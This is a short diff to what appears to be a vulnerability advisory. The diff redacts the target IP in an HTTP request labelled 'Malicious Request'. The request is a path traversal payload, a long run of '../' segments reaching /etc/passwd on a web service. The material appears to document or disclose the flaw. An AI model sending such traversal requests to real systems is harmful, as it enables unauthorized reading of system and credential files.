@@ -23,8 +23,8 @@ Malicious Request:
 
 http
 
-GET /Service/Controller/UI../../../../../../../../../../../../../../../../etc/passwd?ip=192.168.2.2&port=8081 HTTP/1.1
-Host: 192.168.2.2:8081
+GET /Service/Controller/UI../../../../../../../../../../../../../../../../etc/passwd?ip=192.168.2.x&port=8081 HTTP/1.1
+Host: 192.168.2.x:8081
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
